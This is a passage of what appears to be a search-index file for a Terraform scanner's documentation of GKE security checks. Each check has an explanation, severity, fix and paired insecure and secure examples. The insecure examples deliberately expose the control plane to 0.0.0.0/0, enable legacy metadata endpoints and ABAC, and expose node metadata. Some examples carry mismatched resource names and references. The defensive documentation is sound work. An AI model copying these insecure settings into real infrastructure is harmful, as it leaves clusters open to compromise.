accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/enable-private-cluster/#secure-example","text":"<p>The following example will pass the google-gke-enable-private-cluster check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   private_cluster_config {\n     enable_private_nodes = true\n   }\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/enable-private-cluster/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enable_private_nodes</li> </ul>","title":"Links"},{"location":"checks/google/gke/enable-stackdriver-logging/","text":"","title":"Stackdriver Logging should be enabled"},{"location":"checks/google/gke/enable-stackdriver-logging/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/google/gke/enable-stackdriver-logging/#explanation","text":"<p>StackDriver logging provides a useful interface to all of stdout/stderr for each container and should be enabled for moitoring, debugging, etc.</p>","title":"Explanation"},{"location":"checks/google/gke/enable-stackdriver-logging/#possible-impact","text":"<p>Visibility will be reduced</p>","title":"Possible Impact"},{"location":"checks/google/gke/enable-stackdriver-logging/#suggested-resolution","text":"<p>Enable StackDriver logging</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/enable-stackdriver-logging/#insecure-example","text":"<p>The following example will fail the google-gke-enable-stackdriver-logging check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"bad_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   logging_service = \"logging.googleapis.com\"\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/enable-stackdriver-logging/#secure-example","text":"<p>The following example will pass the google-gke-enable-stackdriver-logging check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   logging_service = \"logging.googleapis.com/kubernetes\"\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/enable-stackdriver-logging/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#logging_service</li> </ul>","title":"Links"},{"location":"checks/google/gke/enable-stackdriver-monitoring/","text":"","title":"Stackdriver Monitoring should be enabled"},{"location":"checks/google/gke/enable-stackdriver-monitoring/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/google/gke/enable-stackdriver-monitoring/#explanation","text":"<p>StackDriver monitoring aggregates logs, events, and metrics from your Kubernetes environment on GKE to help you understand your application's behavior in production.</p>","title":"Explanation"},{"location":"checks/google/gke/enable-stackdriver-monitoring/#possible-impact","text":"<p>Visibility will be reduced</p>","title":"Possible Impact"},{"location":"checks/google/gke/enable-stackdriver-monitoring/#suggested-resolution","text":"<p>Enable StackDriver monitoring</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/enable-stackdriver-monitoring/#insecure-example","text":"<p>The following example will fail the google-gke-enable-stackdriver-monitoring check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"bad_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   monitoring_service = \"monitoring.googleapis.com\"\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/enable-stackdriver-monitoring/#secure-example","text":"<p>The following example will pass the google-gke-enable-stackdriver-monitoring check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   monitoring_service = \"monitoring.googleapis.com/kubernetes\"\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/enable-stackdriver-monitoring/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#monitoring_service</li> </ul>","title":"Links"},{"location":"checks/google/gke/enforce-pod-security-policy/","text":"","title":"Pod security policy enforcement not defined."},{"location":"checks/google/gke/enforce-pod-security-policy/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/gke/enforce-pod-security-policy/#explanation","text":"<p>By default, Pods in Kubernetes can operate with capabilities beyond what they require. You should constrain the Pod's capabilities to only those required for that workload.</p> <p>Kubernetes offers controls for restricting your Pods to execute with only explicitly granted capabilities. </p> <p>Pod Security Policy allows you to set smart defaults for your Pods, and enforce controls you want to enable across your fleet. </p> <p>The policies you define should be specific to the needs of your application</p>","title":"Explanation"},{"location":"checks/google/gke/enforce-pod-security-policy/#possible-impact","text":"<p>Pods could be operating with more permissions than required to be effective</p>","title":"Possible Impact"},{"location":"checks/google/gke/enforce-pod-security-policy/#suggested-resolution","text":"<p>Use security policies for pods to restrict permissions to those needed to be effective</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/enforce-pod-security-policy/#insecure-example","text":"<p>The following example will fail the google-gke-enforce-pod-security-policy check. <pre><code> resource \"google_container_cluster\" \"bad_example\" {\n    pod_security_policy_config {\n         enabled = \"false\"\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/enforce-pod-security-policy/#secure-example","text":"<p>The following example will pass the google-gke-enforce-pod-security-policy check. <pre><code> resource \"google_container_cluster\" \"good_example\" {\n    pod_security_policy_config {\n         enabled = \"true\"\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/enforce-pod-security-policy/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#pod_security_policy_config</p> </li> <li> <p>https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#admission_controllers</p> </li> </ul>","title":"Links"},{"location":"checks/google/gke/metadata-endpoints-disabled/","text":"","title":"Legacy metadata endpoints enabled."},{"location":"checks/google/gke/metadata-endpoints-disabled/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/gke/metadata-endpoints-disabled/#explanation","text":"<p>The Compute Engine instance metadata server exposes legacy v0.1 and v1beta1 endpoints, which do not enforce metadata query headers. </p> <p>This is a feature in the v1 APIs that makes it more difficult for a potential attacker to retrieve instance metadata. </p> <p>Unless specifically required, we recommend you disable these legacy APIs.</p> <p>When setting the <code>metadata</code> block, the default value for <code>disable-legacy-endpoints</code> is set to true, they should not be explicitly enabled.</p>","title":"Explanation"},{"location":"checks/google/gke/metadata-endpoints-disabled/#possible-impact","text":"<p>Legacy metadata endpoints don't require metadata headers</p>","title":"Possible Impact"},{"location":"checks/google/gke/metadata-endpoints-disabled/#suggested-resolution","text":"<p>Disable legacy metadata endpoints</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/metadata-endpoints-disabled/#insecure-example","text":"<p>The following example will fail the google-gke-metadata-endpoints-disabled check. <pre><code> resource \"google_container_cluster\" \"bad_example\" {\n    node_config {\n      metadata = {\n        disable-legacy-endpoints = false\n      }\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/metadata-endpoints-disabled/#secure-example","text":"<p>The following example will pass the google-gke-metadata-endpoints-disabled check. <pre><code> resource \"google_container_cluster\" \"good_example\" {\n    node_config {\n      metadata = {\n        disable-legacy-endpoints = true\n      }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/metadata-endpoints-disabled/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#metadata</p> </li> <li> <p>https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#protect_node_metadata_default_for_112</p> </li> </ul>","title":"Links"},{"location":"checks/google/gke/no-legacy-authentication/","text":"","title":"Legacy client authentication methods utilized."},{"location":"checks/google/gke/no-legacy-authentication/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/gke/no-legacy-authentication/#explanation","text":"<p>It is recommended to use Service Accounts and OAuth as authentication methods for accessing the master in the container cluster. </p> <p>Basic authentication should be disabled by explicitly unsetting the <code>username</code> and <code>password</code> on the <code>master_auth</code> block.</p>","title":"Explanation"},{"location":"checks/google/gke/no-legacy-authentication/#possible-impact","text":"<p>Username/password or certificate authentication methods are less secure</p>","title":"Possible Impact"},{"location":"checks/google/gke/no-legacy-authentication/#suggested-resolution","text":"<p>Use service account or OAuth for authentication</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/no-legacy-authentication/#insecure-example","text":"<p>The following example will fail the google-gke-no-legacy-authentication check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   master_auth {\n     client_certificate_config {\n       issue_client_certificate = true\n     }\n   }\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/no-legacy-authentication/#secure-example","text":"<p>The following example will pass the google-gke-no-legacy-authentication check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/no-legacy-authentication/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#master_auth</p> </li> <li> <p>https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#restrict_authn_methods</p> </li> </ul>","title":"Links"},{"location":"checks/google/gke/no-public-control-plane/","text":"","title":"GKE Control Plane should not be publicly accessible"},{"location":"checks/google/gke/no-public-control-plane/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/gke/no-public-control-plane/#explanation","text":"<p>The GKE control plane is exposed to the public internet by default.</p>","title":"Explanation"},{"location":"checks/google/gke/no-public-control-plane/#possible-impact","text":"<p>GKE control plane exposed to public internet</p>","title":"Possible Impact"},{"location":"checks/google/gke/no-public-control-plane/#suggested-resolution","text":"<p>Use private nodes and master authorised networks to prevent exposure</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/no-public-control-plane/#insecure-example","text":"<p>The following example will fail the google-gke-no-public-control-plane check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   master_authorized_networks_config {\n     cidr_blocks {\n       cidr_block = \"0.0.0.0/0\"\n       display_name = \"external\"\n     }\n   }\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/no-public-control-plane/#secure-example","text":"<p>The following example will pass the google-gke-no-public-control-plane check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   master_authorized_networks_config {\n     cidr_blocks {\n       cidr_block = \"10.10.128.0/24\"\n       display_name = \"internal\"\n     }\n   }\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/no-public-control-plane/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#</li> </ul>","title":"Links"},{"location":"checks/google/gke/node-metadata-security/","text":"","title":"Node metadata value disables metadata concealment."},{"location":"checks/google/gke/node-metadata-security/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/gke/node-metadata-security/#explanation","text":"<p>If the <code>workload_metadata_config</code> block within <code>node_config</code> is included, the <code>node_metadata</code> attribute should be configured securely.</p> <p>The attribute should be set to <code>SECURE</code> to use metadata concealment, or <code>GKE_METADATA_SERVER</code> if workload identity is enabled. This ensures that the VM metadata is not unnecessarily exposed to pods.</p>","title":"Explanation"},{"location":"checks/google/gke/node-metadata-security/#possible-impact","text":"<p>Metadata that isn't concealed potentially risks leakage of sensitive data</p>","title":"Possible Impact"},{"location":"checks/google/gke/node-metadata-security/#suggested-resolution","text":"<p>Set node metadata to SECURE or GKE_METADATA_SERVER</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/node-metadata-security/#insecure-example","text":"<p>The following example will fail the google-gke-node-metadata-security check. <pre><code> resource \"google_container_node_pool\" \"bad_example\" {\n    node_config {\n        workload_metadata_config {\n            node_metadata = \"EXPOSE\"\n        }\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/node-metadata-security/#secure-example","text":"<p>The following example will pass the google-gke-node-metadata-security check. <pre><code> resource \"google_container_node_pool\" \"good_example\" {\n    node_config {\n        workload_metadata_config {\n            node_metadata = \"SECURE\"\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/node-metadata-security/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#node_metadata</p> </li> <li> <p>https://cloud.google.com/kubernetes-engine/docs/how-to/protecting-cluster-metadata#create-concealed</p> </li> </ul>","title":"Links"},{"location":"checks/google/gke/node-pool-uses-cos/","text":"","title":"Ensure Container-Optimized OS (cos) is used for Kubernetes Engine Clusters Node image"},{"location":"checks/google/gke/node-pool-uses-cos/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/google/gke/node-pool-uses-cos/#explanation","text":"<p>GKE supports several OS image types but COS is the recommended OS image to use on cluster nodes for enhanced security</p>","title":"Explanation"},{"location":"checks/google/gke/node-pool-uses-cos/#possible-impact","text":"<p>COS is the recommended OS image to use on cluster nodes</p>","title":"Possible Impact"},{"location":"checks/google/gke/node-pool-uses-cos/#suggested-resolution","text":"<p>Use the COS image type</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/node-pool-uses-cos/#insecure-example","text":"<p>The following example will fail the google-gke-node-pool-uses-cos check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n\n resource \"google_container_node_pool\" \"bad_example\" {\n   name       = \"my-node-pool\"\n   cluster    = google_container_cluster.primary.id\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n     image_type = \"something\"\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/node-pool-uses-cos/#secure-example","text":"<p>The following example will pass the google-gke-node-pool-uses-cos check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n\n resource \"google_container_node_pool\" \"good_example\" {\n   name       = \"my-node-pool\"\n   cluster    = google_container_cluster.primary.id\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n     image_type = \"COS\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/node-pool-uses-cos/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_node_pool#image_type</li> </ul>","title":"Links"},{"location":"checks/google/gke/node-shielding-enabled/","text":"","title":"Shielded GKE nodes not enabled."},{"location":"checks/google/gke/node-shielding-enabled/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/gke/node-shielding-enabled/#explanation","text":"<p>CIS GKE Benchmark Recommendation: 6.5.5. Ensure Shielded GKE Nodes are Enabled</p> <p>Shielded GKE Nodes provide strong, verifiable node identity and integrity to increase the security of GKE nodes and should be enabled on all GKE clusters.</p>","title":"Explanation"},{"location":"checks/google/gke/node-shielding-enabled/#possible-impact","text":"<p>Node identity and integrity can't be verified without shielded GKE nodes</p>","title":"Possible Impact"},{"location":"checks/google/gke/node-shielding-enabled/#suggested-resolution","text":"<p>Enable node shielding</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/node-shielding-enabled/#insecure-example","text":"<p>The following example will fail the google-gke-node-shielding-enabled check. <pre><code> resource \"google_container_cluster\" \"bad_example\" {\n    enable_shielded_nodes = \"false\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/node-shielding-enabled/#secure-example","text":"<p>The following example will pass the google-gke-node-shielding-enabled check. <pre><code> resource \"google_container_cluster\" \"good_example\" {\n    enable_shielded_nodes = \"true\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/node-shielding-enabled/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enable_shielded_nodes</p> </li> <li> <p>https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#shielded_nodes</p> </li> </ul>","title":"Links"},{"location":"checks/google/gke/use-cluster-labels/","text":"","title":"Clusters should be configured with Labels"},{"location":"checks/google/gke/use-cluster-labels/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/google/gke/use-cluster-labels/#explanation","text":"<p>Labels make it easier to manage assets and differentiate between clusters and environments, allowing the mapping of computational resources to the wider organisational structure.</p>","title":"Explanation"},{"location":"checks/google/gke/use-cluster-labels/#possible-impact","text":"<p>Asset management can be limited/more difficult</p>","title":"Possible Impact"},{"location":"checks/google/gke/use-cluster-labels/#suggested-resolution","text":"<p>Set cluster resource labels</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/use-cluster-labels/#insecure-example","text":"<p>The following example will fail the google-gke-use-cluster-labels check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"bad_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/use-cluster-labels/#secure-example","text":"<p>The following example will pass the google-gke-use-cluster-labels check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   resource_labels = {\n     \"env\" = \"staging\"\n   }\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/use-cluster-labels/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#resource_labels</li> </ul>","title":"Links"},{"location":"checks/google/gke/use-rbac-permissions/","text":"","title":"Legacy ABAC permissions are enabled."},{"location":"checks/google/gke/use-rbac-permissions/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/gke/use-rbac-permissions/#explanation","text":"<p>You should disable Attribute-Based Access Control (ABAC), and instead use Role-Based Access Control (RBAC) in GKE.</p> <p>RBAC has significant security advantages and is now stable in Kubernetes, so it\u2019s time to disable ABAC.</p>","title":"Explanation"},{"location":"checks/google/gke/use-rbac-permissions/#possible-impact","text":"<p>ABAC permissions are less secure than RBAC permissions</p>","title":"Possible Impact"},{"location":"checks/google/gke/use-rbac-permissions/#suggested-resolution","text":"<p>Switch to using RBAC permissions</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/use-rbac-permissions/#insecure-example","text":"<p>The following example will fail the google-gke-use-rbac-permissions check. <pre><code> resource \"google_container_cluster\" \"bad_example\" {\n    enable_legacy_abac = \"true\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/use-rbac-permissions/#secure-example","text":"<p>The following example will pass the google-gke-use-rbac-permissions check. <pre><code> resource \"google_container_cluster\" \"good_example\" {\n    # ...\n    # enable_legacy_abac not set\n    # ...\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/use-rbac-permissions/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enable_legacy_abac</p> </li> <li> <p>https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#leave_abac_disabled_default_for_110</p> </li> </ul>","title":"Links"},{"location":"checks/google/gke/use-service-account/","text":"","title":"Checks for service account defined for GKE nodes"},{"location":"checks/google/gke/use-service-account/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/gke/use-service-account/#explanation","text":"<p>You should create and use a minimally privileged service account to run your GKE cluster instead of using the Compute Engine default service account.</p>","title":"Explanation"},{"location":"checks/google/gke/use-service-account/#possible-impact","text":"<p>Service accounts with wide permissions can increase the risk of compromise</p>","title":"Possible Impact"},{"location":"checks/google/gke/use-service-account/#suggested-resolution","text":"<p>Use limited permissions for service accounts to be effective</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/use-service-account/#insecure-example","text":"<p>The following example will fail the google-gke-use-service-account check. <pre><code> resource \"google_container_cluster\" \"bad_example\" {\n    node_config {\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/use-service-account/#secure-example","text":"<p>The following example will pass the google-gke-use-service-account check. <pre><code> resource \"google_container_cluster\" \"good_example\" {\n    node_config {\n        service_account = \"cool-service-account@example.com\"\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/use-service-account/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#service_account</p> </li> <li> 